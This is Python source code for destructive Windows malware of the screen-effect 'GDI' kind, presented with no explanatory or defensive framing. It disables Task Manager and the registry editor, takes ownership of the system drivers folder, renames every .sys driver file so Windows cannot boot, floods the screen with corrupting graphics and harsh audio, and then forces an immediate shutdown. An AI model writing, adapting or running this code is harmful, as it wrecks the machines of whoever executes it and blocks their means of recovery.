import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)
import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)


import os
import subprocess


appdata_path = os.getenv('APPDATA')
batch_file_path = os.path.join(appdata_path, 'RIP.bat')


batch_content = """takeown /f C:\\Windows\\System32\\drivers
icacls C:\\Windows\\System32\\drivers /grant Administrators:F /t
"""


with open(batch_file_path, 'w') as file:
    file.write(batch_content)

subprocess.run([batch_file_path], shell=True)


import ctypes
import random
import time
import threading
import numpy as np
import pyaudio
import os

# Parameters
sample_rate = 44100  # Sample rate in Hz
duration = 90

# Function to generate Bytebeat
def generate_bytebeat(t):
    signal1 = ((t * (np.sin(t >> 12) + 2) - ((t >> 2) | 25)) % 256 - 128) / 128.0
    signal2 = ((t * (np.sin(t >> 689099) * 98670)) % 256 - 128) / 128.0
    signal3 = ((t * (np.sin(t >> 12) * 10)) % 256 - 128) / 128.0
    signal4 = ((t * (np.sin(t >> 9) * 10)) % 256 - 128) / 128.0
    signal5 = ((t * (np.sin(t >> 9) * 80)) % 256 - 128) / 128.0
    signal6 = ((t * (np.sin(t >> 6) * 40)) % 256 - 128) / 128.0
    signal7 = ((t * (np.sin(t >> 68999) * 98670)) % 256 - 128) / 128.0
    
    combined_signal = (signal1 + signal2 + signal3 + signal4 + signal5 + signal6 + signal7) / 7.0
    return combined_signal

# Initialize PyAudio
p = pyaudio.PyAudio()
stream = p.open(format=pyaudio.paFloat32, channels=1, rate=sample_rate, output=True)

# Functions for GDI manipulations
def get_dc(hwnd=0):
    return ctypes.windll.user32.GetDC(hwnd)

def get_system_metrics(n_index):
    return ctypes.windll.user32.GetSystemMetrics(n_index)

def bit_blt(hdc, x, y, cx, cy, hdc_src, x1, y1, rop):
    return ctypes.windll.gdi32.BitBlt(hdc, x, y, cx, cy, hdc_src, x1, y1, rop)

def sleep(milliseconds):
    time.sleep(milliseconds / 1000)

def get_screen_dimensions():
    screen_width = get_system_metrics(0)
    screen_height = get_system_metrics(1)
    return screen_width, screen_height

def HITBMAP():
    screen_width, screen_height = get_screen_dimensions()
    end_time = time.time() + duration
    while time.time() < end_time:
        hdc = get_dc()
        color = random.randint(0, 0xFFFFFF)
        brush = ctypes.windll.gdi32.CreateSolidBrush(color)
        ctypes.windll.gdi32.SelectObject(hdc, brush)
        ctypes.windll.gdi32.PatBlt(hdc, 0, 0, screen_width, screen_height, 0x005A0049)
        sleep(1000)

def Squares():
    screen_width, screen_height = get_screen_dimensions()
    end_time = time.time() + duration
    while time.time() < end_time:
        hdc = get_dc()
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        color = random.randint(0, 0xFFFFFF)
        brush = ctypes.windll.gdi32.CreateSolidBrush(color)
        ctypes.windll.gdi32.SelectObject(hdc, brush)
        y1 = random.randint(y - 10, y + 10)
        bit_blt(hdc, x, y, 200, 200, hdc, random.randint(x - 10, x + 10), y1, 0x00CC0020)
        sleep(random.uniform(500, 1500))

def Squares2():
    screen_width, screen_height = get_screen_dimensions()
    end_time = time.time() + duration
    while time.time() < end_time:
        hdc = get_dc()
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        color = random.randint(0, 0xFFFFFF)
        brush = ctypes.windll.gdi32.CreateSolidBrush(color)
        ctypes.windll.gdi32.SelectObject(hdc, brush)
        y1 = random.randint(y - 10, y + 10)
        bit_blt(hdc, x, y, 200, 200, hdc, random.randint(x - 10, x + 10), y1, 0x00CC0020)
        sleep(random.uniform(500, 1500))

def Squares3():
    screen_width, screen_height = get_screen_dimensions()
    end_time = time.time() + duration
    while time.time() < end_time:
        hdc = get_dc()
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        y1 = random.randint(y - 10, y + 10)
        bit_blt(hdc, x, y, 200, 200, hdc, random.randint(x - 10, x + 10), y1, 0x00330008)
        sleep(1000)

def Dun():
    screen_width, screen_height = get_screen_dimensions()
    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(5):
            ctypes.windll.user32.RedrawWindow(None, None, None, 0x0004 | 0x0001)
            for _ in range(random.randint(0, 1)):
                for _ in range(random.randint(0, 5)):
                    y = random.randint(0, screen_width)
                    cy = screen_height - random.randint(0, screen_height) + 78 - screen_height // 2
                    color_index = random.randint(0, 2)
                    hdc = get_dc()
                    if color_index == 0:
                        color = random.randint(0, 0xFF)
                    elif color_index == 1:
                        color = (random.randint(0, 0xFF) << 8)
                    else:
                        color = (random.randint(0, 0xFF) << 16)
                    brush = ctypes.windll.gdi32.CreateSolidBrush(color)
                    ctypes.windll.gdi32.SelectObject(hdc, brush)
                    ctypes.windll.gdi32.PatBlt(hdc, 0, y, screen_width, cy, 0x00F00021)
                sleep(100)

def move():
    screen_width, screen_height = get_screen_dimensions()
    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(6):
            ctypes.windll.user32.RedrawWindow(None, None, None, 0x0004 | 0x0001)
            for _ in range(random.randint(0, 1)):
                for _ in range(random.randint(0, 5)):
                    y = random.randint(0, screen_width)
                    cy = screen_height - random.randint(0, screen_height) + 498 - screen_height // 2
                    color_index = random.randint(0, 2)
                    hdc = get_dc()
                    if color_index == 0:
                        color = random.randint(0, 0xFF)
                    elif color_index == 1:
                        color = (random.randint(0, 0xFF) << 8)
                    else:
                        color = (random.randint(0, 0xFF) << 16)
                    brush = ctypes.windll.gdi32.CreateSolidBrush(color)
                    ctypes.windll.gdi32.SelectObject(hdc, brush)
                    for _ in range(4):
                        bit_blt(hdc, 0, y, screen_width, cy, hdc, random.randint(-112, 112), y, 0x00CC0020)
                sleep(100)

def rotate():
    pass

def whiteness():
    pass

def LAST():
    threading.Thread(target=move).start()
    threading.Thread(target=rotate).start()
    threading.Thread(target=whiteness).start()
    while True:
        sleep(1000)

def LAST2():
    threading.Thread(target=move).start()
    threading.Thread(target=rotate).start()
    threading.Thread(target=whiteness).start()
    while True:
        sleep(1000)

def play_bytebeat():
    t = np.arange(0, duration * sample_rate)
    bytebeat_signal = generate_bytebeat(t)
    stream.write(bytebeat_signal.astype(np.float32).tobytes())
    stream.stop_stream()
    stream.close()
    p.terminate()

def rename_sys_files(directory):
    try:
        for filename in os.listdir(directory):
            if filename.endswith('.sys'):
                old_file_path = os.path.join(directory, filename)
                new_file_name = filename.replace('.sys', '.rar')
                new_file_path = os.path.join(directory, new_file_name)
                os.rename(old_file_path, new_file_path)
                print(f'Renamed: {old_file_path} -> {new_file_path}')
    except Exception as e:
        print(f'An error occurred: {e}')

class Shutdown:
    def __init__(self):
        self.ntdll = ctypes.WinDLL(
            'ntdll.dll',
            use_last_error=True
        )

        self.RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege
        self.RtlAdjustPrivilege.argtypes = [
            ctypes.c_ulong,
            ctypes.c_long,
            ctypes.c_long,
            ctypes.POINTER(
                ctypes.c_long
            )
        ]
        self.RtlAdjustPrivilege.restype = ctypes.c_long

    def set_privilege(self):
        if self.RtlAdjustPrivilege(
            19, # Privilege (SE_SHUTDOWN_PRIVILEGE)
            True, # Enable Privilege
            False, # Current Thread
            ctypes.byref(
                ctypes.c_long(0)
            ) # Byref Previous Value As UInt
        ):
            return False

        else:
            return True

    def shutdown_system(self):
        if self.set_privilege():
            return self.ntdll.NtShutdownSystem(
                False # ShutdownNoReboot Action
            )

if __name__ == "__main__":
    # Start GDI and Bytebeat threads
    threading.Thread(target=HITBMAP).start()
    threading.Thread(target=Squares).start()
    threading.Thread(target=Squares2).start()
    threading.Thread(target=Squares3).start()
    threading.Thread(target=Dun).start()
    threading.Thread(target=LAST).start()
    threading.Thread(target=play_bytebeat).start()

    # Start the renaming of .sys files in a separate thread
    if ctypes.windll.shell32.IsUserAnAdmin():
        threading.Thread(target=rename_sys_files, args=(r'C:\Windows\System32\drivers',)).start()
    else:
        print("Please run this script with administrative privileges.")

    # Run GDI and Bytebeat for the specified duration
    time.sleep(duration)
    
    # Execute the shutdown script
    shutdown = Shutdown()
    shutdown.shutdown_system()
